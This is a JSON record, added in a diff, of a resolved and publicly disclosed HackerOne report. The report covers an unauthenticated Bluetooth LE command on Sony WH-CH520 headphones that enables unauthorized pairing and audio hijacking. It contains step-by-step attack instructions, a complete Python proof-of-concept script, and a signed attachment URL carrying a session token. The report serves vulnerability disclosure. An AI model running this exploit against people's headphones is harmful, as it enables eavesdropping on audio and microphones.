@@ -1,0 +1,124 @@
+{
+  "id": 3514490,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTE0NDkw",
+  "url": "https://hackerone.com/reports/3514490",
+  "title": "Improper State Validation on Sony WH-CH520 via BLE Command Service leads to unauthorized Bluetooth pairing and audio hijacking",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-01-17T11:59:57.277Z",
+  "submitted_at": "2026-01-17T11:59:57.357Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vortekx",
+    "url": "/vortekx",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4ohtqki7uigvb5lru4cebcck8j6d/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16427,
+    "url": "https://hackerone.com/sony",
+    "handle": "sony",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/427/554594bb2f3fe33ee0f4971daf33bca27d1421d9_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/427/554594bb2f3fe33ee0f4971daf33bca27d1421d9_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Sony",
+      "twitter_handle": "",
+      "website": "http://www.sony.com",
+      "about": "Secure@Sony"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2025-36911"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-02-17T15:02:08.193Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-02-06T16:42:02.629Z",
+  "team_member_agreed_on_going_public_at": "2026-02-17T15:02:07.799Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n**Improper State Validation allows Unauthorized Bluetooth Pairing and Audio Hijacking for Sony headphones**\n\nI have discovered an Improper State Validation vulnerability in the Sony WH-CH520 firmware. The device allows an unauthenticated write to the proprietary Sony Command Service via Bluetooth Low Energy (BLE), which forces the device to become discoverable and accept a standard Bluetooth Security Manager Protocol (SMP) pairing request, even when the device is actively in use and not in \"Pairing Mode.\"\n\nOn Windows systems, this BLE pairing is automatically upgraded to a Classic Audio connection via Cross-Transport Key Derivation (CTKD), allowing an attacker to hijack the audio stream without physical interaction.\n\n## Steps To Reproduce:\n\n**Prerequisites:**\n*   **Target:** Sony WH-CH520 headset (Vulnerability verified).\n    *   *Note: Comparative testing was performed on the WH-1000XM4, which was unsuccessful and rejected the attack. (so probably not the same vulnerability as WhisperPair (CVE-2025-36911))*\n*   **Victim:** A phone or computer with an existing connection to the headphones.\n*   **Attacker:** A Windows 11 PC (with python 3.12 and `pip install bleak` to run attached script).\n\n**Attack Flow:**\n1.  Connect the Sony WH-CH520 to the victim's device and begin playing audio. Ensure the headphones are **not** in Pairing Mode (the LED should not be flashing blue).\n2.  On the attacker's machine, ensure Bluetooth is enabled and bring it within BLE range of the headphones.\n3.  Execute the attached Proof-of-Concept (PoC) script.\n    *   *The script targets the closest Sony device.*\n    *   *It connects to the GATT server and writes 0x01 to the Sony Command Characteristic (5b833c11)*\n4.  **Observation:** Windows will display a \"New WH-CH520 found\" notification (Microsoft Swift Pair).\"\n    *   This confirms the device is able to solicit a new connect even when not put in pairing mode. See attached screenshot:\n    *    {F5238628}\n5.  Click \"Connect\" on the Windows notification.\n6.  **Technical Event (Why I think this works):**\n    *   Windows initiates a standard SMP Pairing Request. Because the script forced the device into an advertising state, the firmware accepts the bond.\n    *   Because the device supports Bluetooth 5.x, Windows automatically performs **Cross-Transport Key Derivation (CTKD)**. It uses the keys exchanged over the Low Energy (Data) link to generate the encryption keys for the Classic (Audio) link.\n7.  **Result:**\n    *   **Single-Point Mode:** The connection is stolen from the victim; audio stops playing on the victim device and switches to the attacker.\n    *   **Multipoint Mode:** The attacker is added as a second device without the owner's permission.\n    *   **Audio Access:** The attacker now has full Audio and Microphone access to the headset. No physical interaction with the headphones was required.\n\n## Supporting Material/References:\n\n### Proof of Concept Script (Python)\nThis script demonstrates the core vulnerability. It identifies the target and injects the unauthenticated command that triggers the hijacking state.\n\n**How this script works:**\n1.  **Scanning:** It scans for Bluetooth Low Energy devices for 5 seconds.\n2.  **Targeting:** It filters devices broadcasting the Sony Proprietary Service (`0x5B83`) or Fast Pair headers. It automatically selects the device with the strongest signal (RSSI) to target the headphones closest to the attacker.\n3.  **Exploitation:** It connects to the Generic Attribute Profile (GATT) **without pairing**.\n4.  **Injection:** It writes the byte `0x01` to the proprietary characteristic `5b833c11-6bc7-4802-8e9a-723ceca4bd8f`.\n5.  **Result:** If successful, this write triggers the headphones to broadcast a Swift Pair advertisement, exposing the device as described above.\n\n```python\nimport asyncio\nfrom bleak import BleakScanner, BleakClient\n\n# --- CONFIGURATION ---\n# Sony Proprietary Service UUID\nSONY_SERVICE_UUID = \"5b833e05-6bc7-4802-8e9a-723ceca4bd8f\"\n# The Command Characteristic that accepts unauthenticated writes\nSONY_COMMAND_CHAR = \"5b833c11-6bc7-4802-8e9a-723ceca4bd8f\" \n\nasync def exploit_sony_ble():\n    print(\"=\"*60)\n    print(\"[*] Sony WH-CH520 Vulnerability PoC\")\n    print(\"[*] Mechanism: Unauthenticated Write -> Forced Swift Pair Trigger\")\n    print(\"=\"*60)\n    print(\"[-] Scanning for closest vulnerable device...\")\n    \n    # 1. SCANNING PHASE\n    target = None\n    devices = await BleakScanner.discover(timeout=5.0, return_adv=True)\n    \n    for d, adv in devices.values():\n        uuids = [str(u) for u in adv.service_uuids]\n        if SONY_SERVICE_UUID in uuids or 'fe2c' in str(adv.service_data):\n            # Select strongest signal\n            if not target or adv.rssi > target[1].rssi:\n                target = (d, adv)\n\n    if not target:\n        print(\"[X] Target not found. Ensure headphones are powered on.\")\n        return\n\n    device, adv = target\n    print(f\"[+] TARGET ACQUIRED: {device.address}\")\n    print(f\"    RSSI: {adv.rssi} dBm\")\n\n    # 2. CONNECTION PHASE\n    print(f\"[-] Connecting to GATT (Unauthenticated)...\")\n    \n    try:\n        async with BleakClient(device.address) as client:\n            print(\"[+] Connected successfully.\")\n            \n            # 3. EXPLOITATION PHASE\n            try:\n                char = client.services.get_characteristic(SONY_COMMAND_CHAR)\n                if not char:\n                    print(\"[-] Vulnerable characteristic not found.\")\n                    return\n\n                print(f\"[i] Found Command Char: {SONY_COMMAND_CHAR}\")\n                print(\"[-] Attempting to inject payload (0x01)...\")\n                \n                # Writing to this characteristic triggers the device to broadcast\n                # a Microsoft Swift Pair notification to Windows.\n                await client.write_gatt_char(char, bytes([0x01]), response=True)\n                \n                print(\"\\n[!!!] CRITICAL: WRITE SUCCESSFUL [!!!]\")\n                print(\"1. Unauthenticated Access Confirmed.\")\n                print(\"2. Check Windows for the 'Microsoft Swift Pair' popup.\")\n                print(\"3. Accepting the popup will hijack the audio stream.\")\n                \n            except Exception as e:\n                print(f\"[-] Write Failed: {e}\")\n                if \"insufficient\" in str(e).lower():\n                    print(\"    [+] Device is SECURE (Authentication required).\")\n                else:\n                    print(\"    [-] Try restarting bluetooth and trying again.\")\n\n    except Exception as e:\n        print(f\"[X] Connection Error: {e}\")\n\nif __name__ == \"__main__\":\n    asyncio.run(exploit_sony_ble())\n```",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5238628,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/r4m63lmsbqb9z4ziz91cs6y1et6t?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZE5SLRL5%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T193826Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGytusGuUOs%2BXGE%2BmOnlE8GSUI8tHpAOyuZ7X1ZLgiUDAiEA06JbqoUcz3378vb9CcW%2FsKgn9EAZpUrMfr6%2B2lHhA5oquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIr44srZhPCu%2BFbJkiqPBY8tFmcIht%2BNXO1%2Bke0nDdL6tT6Wl%2BXiZI%2B1elyIk0u8A4cqm0erRK0paKn6IZklfEkgu%2BMFrS2wgj%2FZtmiabPKlo%2BlLweGkyiBbGh7Qz0pvJmheQt6n8fZ4dS4CkFWEgEleSZfH%2B7TzhTn52LhDfelcmkRgJvVowl41QUmWWFCCiofh55rBmx92UCZTV27Iu1lx%2F%2BhWu3%2BgrVqUe513oF0GCg5Rs9srYolnuPN7kYqyohaQ08iUCP0yS0t2bGmpBRXjVjFAcKpnXZK1W75uNCIRbxvoblNaKNfDf4yb0DLsa9vzIAotbGrvxfiWkf1GjXF7757J3tb73ipovYZuCMtHt5EXXW3uCbr7re2DnK0%2BGM89znpsyQAJEoXNd8E6RZiLkRrKuPSREqYzXgVAcl2ixm9ptHDYXUyI3Edf9jTONZpqY6%2FXYj7uHhUlqNnJNM6lZpKQNH%2FGDJ5LfQxHDOV0wzskcJsu%2Bm8%2B2rYrBXzGouiYWlmtfGvJrPdH4ETPgn7Ssht6tK68Ux8VynJxk8zGliKXpdMqBs%2F3sf7mpY0SnmRJc7XwTzjnh4odLq%2BKuopahPXZjWC6c0mkSj3TPkuylnUol98vpFUCERBwrI6zP%2FQjpskAVbt8mTlo0pa3pL2PgBWFeClmftVoiwrXb8EIPVrAIPLXgbt3C6Rnk3PmxuNOsuuS6gIRxwZ0A65sAc4AWZ%2BKMq5jPWYjsgzOgSomcFthTDI4A3xJSE2V9kF4EO6LCAdR8nVW%2FvPteid3FqxEhWOCZ0h83ZYa9UWaPKLVKAR2M82dKNLAwgPY%2BAAzbsU4Q%2Fm%2FdVR%2BMOpEgwbT9Ndk%2ByrdrXlF5kSIFWraOl7NLX3x91hZt%2F6UulLohmYwlrXizAY6sQFiU5BItJkkZ1M718A3m16ova71gEURM1cKKI2Pb%2FnPRw85xUtp69rcqoG8d%2F1C9hT%2B2wILFvhC1BtVRr8FUcAUZUvJ9vsU07UQMKJ6DrUZkGHQiX7P2ht1aOYVu37nSZJUumb3vqTYG2Y2qGbO%2BnKggDXeIa2LRWdB3GsAqbyK33bfmOcJsEdGES6QiQYa3IzfFgwnJuhjCojhMLi4S%2B1hLvvfLHJC1VmKd46goOrZ%2F30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ece03e5c20c94db2b10c9323dc34a4771393265bec9d615deb56273bbd4da423",
+      "file_size": 68137,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 34,
+  "voters": [
+    "zy9ard3",
+    "aahmed646",
+    "ahmed_xyz",
+    "2026",
+    "sin99xx",
+    "jackiehavoltrey",
+    "go8ombiz",
+    "hu3y",
+    "heshamh",
+    "dmillerpenetrationtester",
+    "and 24 more..."
+  ],
+  "structured_scope": {
+    "databaseId": 84385,
+    "asset_type": "OTHER",
+    "asset_identifier": "Security vulnerabilities that are identified in Sony products or in website domains owned, operated, or controlled by Sony are in scope.  ",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
